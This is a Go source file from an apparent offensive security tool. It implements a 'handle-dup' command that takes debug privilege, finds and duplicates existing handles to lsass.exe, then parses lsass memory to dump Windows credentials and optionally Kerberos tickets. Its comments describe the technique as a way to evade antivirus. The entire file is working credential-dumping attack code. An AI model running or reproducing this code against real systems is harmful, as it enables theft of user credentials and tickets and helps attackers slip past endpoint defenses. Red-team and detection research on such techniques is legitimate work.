package lsass

import (
	"fmt"
	"strings"

	"github.com/spf13/cobra"
	"golang.org/x/sys/windows"

	"github.com/vincd/savoir/modules/sekurlsa"
	"github.com/vincd/savoir/windows/ntdll"
	"github.com/vincd/savoir/windows/process"
)

// From the article "Duping AV with handles", we try to duplicate handle on the
// lsass process
// Source: https://skelsec.medium.com/duping-av-with-handles-537ef985eb03
func FindLsassHandles() ([]windows.Handle, error) {
	// 1. Get debug privileges.
	if err := ntdll.AskPrivilege(ntdll.SE_DEBUG); err != nil {
		return nil, err
	}

	currentProcessHandle, err := windows.GetCurrentProcess()
	if err != nil {
		return nil, err
	}
	defer windows.CloseHandle(currentProcessHandle)

	// NtQuerySystemInformation will yield all handles opened for all processes.
	// This also includes the PID information of the process for each handle.
	// After this, for each PID/handle:
	systemHandleInfo, err := ntdll.QuerySystemHandleInformation()
	if err != nil {
		return nil, err
	}

	handles := make([]windows.Handle, 0)
	for _, handleInfo := range systemHandleInfo.Handles {
		if handleInfo.UniqueProcessID == 4 {
			continue
		}

		// 3. OpenProcess with PROCESS_DUP_HANDLE privilege.
		// This allows us to duplicate the handle.
		processHandle, err := windows.OpenProcess(windows.PROCESS_DUP_HANDLE, false, handleInfo.UniqueProcessID)
		if err != nil {
			// fmt.Printf("Cannot open process with pid %d: %s\n", handleInfo.UniqueProcessID, err)
			continue
		}
		defer windows.CloseHandle(processHandle)

		// 4. NtDuplicateObject will get a copy of the handle of the remote
		// process to our process. Recommended to pass at least PROCESS_VM_READ
		// for DesiredAccess.
		var duplicateHandle ntdll.Handle
		status := ntdll.NtDuplicateObject(ntdll.Handle(processHandle), ntdll.Handle(handleInfo.HandleValue), ntdll.Handle(currentProcessHandle), &duplicateHandle, windows.PROCESS_QUERY_INFORMATION|windows.PROCESS_VM_READ, 0, 0)
		if !status.IsSuccess() {
			// fmt.Printf("Cannot duplicate object for %d and handle %d\n", handleInfo.UniqueProcessID, handleInfo.HandleValue)
			continue
		}
		// Don't defer this handle here because we may need to return it later

		// 5. NtQueryObject will tell us if this handle is a Process handle or
		// something else.
		// (there are a lot of types, and OMG GUESS WHAT IT'S NOT DOCUMENTED)
		objInfo, status := ntdll.QueryObject(duplicateHandle, ntdll.ObjectTypeInformation)
		if !status.IsSuccess() {
			windows.CloseHandle(windows.Handle(duplicateHandle))
			continue
		}

		if objInfo.TypeName.String() == "Process" {
			// 7. If it's a process handle, QueryFullProcessImageName invoked
			// with the handle will show the process executable path. If it's
			// lsass.exe then we have found a good match and can begin parsing.
			processName, err := process.QueryFullProcessImageName(windows.Handle(duplicateHandle), 0)
			if err != nil {
				windows.CloseHandle(windows.Handle(duplicateHandle))
				// fmt.Printf("Cannot query full process image name for pid %d: %s\n", handleInfo.UniqueProcessID, err)
				continue
			}

			if !strings.Contains(strings.ToLower(processName), "lsass.exe") {
				windows.CloseHandle(windows.Handle(duplicateHandle))
				continue
			}

			handles = append(handles, windows.Handle(duplicateHandle))
		}
	}

	return handles, nil
}

func init() {
	var isJson bool
	var dumpKerberosTicket bool

	var handleDumpCmd = &cobra.Command{
		Use:   "handle-dup",
		Short: "Duplicate opened handle to lsass to parse it",
		Long:  `With DEBUG privilege, search for an opened handle on lsass.exe, duplicate it then dump lsass. Idea from (@skelsec)[https://skelsec.medium.com/duping-av-with-handles-537ef985eb03].`,
		Args: func(cmd *cobra.Command, args []string) error {
			return nil
		},
		RunE: func(cmd *cobra.Command, args []string) error {
			handles, err := FindLsassHandles()
			if err != nil {
				return err
			}

			for _, handle := range handles {
				p, err := process.NewProcessReaderWithHandle("lsass.exe", 0, handle)
				if err != nil {
					fmt.Printf("Cannot create new reader: %s\n", err)
					continue
				}
				defer p.Close()

				l, err := sekurlsa.NewLsaSrv(p)
				if err != nil {
					fmt.Printf("Cannot parse lsass: %s\n", err)
					continue
				}

				si := systemInfo{
					MajorVersion:          p.MajorVersion,
					MinorVersion:          p.MinorVersion,
					BuildNumber:           uint32(p.BuildNumber()),
					ProcessorArchitecture: p.ProcessorArchitecture().String(),
				}

				return PrintLsassDump(si, l, isJson, dumpKerberosTicket)
			}

			return fmt.Errorf("Cannot find an handle to parse lsass.")
		},
	}

	handleDumpCmd.Flags().BoolVarP(&isJson, "json", "j", false, "Print output as a JSON object")
	handleDumpCmd.Flags().BoolVarP(&dumpKerberosTicket, "dump-tickets", "d", false, "Dump Kerberos Tickets to kirbi files")

	Command.AddCommand(handleDumpCmd)
}
